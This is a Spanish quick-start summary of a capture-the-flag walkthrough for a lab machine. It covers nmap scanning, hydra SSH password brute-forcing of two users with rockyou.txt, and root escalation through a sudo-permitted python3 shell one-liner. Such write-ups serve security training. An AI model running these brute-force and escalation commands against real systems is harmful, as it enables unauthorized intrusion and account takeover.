# Quick Start - Pequeñas Mentirosas
(Varios comandos han sido resumidos o cambiados para ser ejecutados de forma rapida, para ver los comandos sin abreviar dirigirse a el writteUp completo)
## Resumen Rápido

### 1. Escaneo Inicial

```bash
nmap -p- -T4 <IP>
```

**Resultado:** Puertos abiertos: 22 (SSH), 80 (HTTP)

### 2. Enumeración HTTP

Acceder a `http://<IP>` 

**Pista encontrada:** "Encuentra la clave para A en los archivos"

### 3. Ataque Fuerza Bruta - Usuario A

```bash
hydra -l A -P rockyou.txt ssh://<IP>
```

### 4. Acceso SSH Usuario A

Ingresar con credenciales obtenidas en el paso anterior.

### 5. Exploración `/srv/ftp`

```bash
ls -la /srv/ftp
cat /srv/ftp/pista_de_fuerza_bruta.txt
```

**Resultado:** Se identifica la necesidad de obtener credenciales del usuario "spencer"

### 6. Ataque Fuerza Bruta - Usuario Spencer

```bash
hydra -l spencer -P rockyou.txt ssh://<IP>
```

### 7. Acceso SSH Usuario Spencer

Ingresar con credenciales obtenidas.

### 8. Verificar Permisos Sudo

```bash
sudo -l
```

**Resultado:** El usuario puede ejecutar `python3` sin contraseña.

### 9. Escalada de Privilegios

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

**Resultado:** Acceso de root obtenido
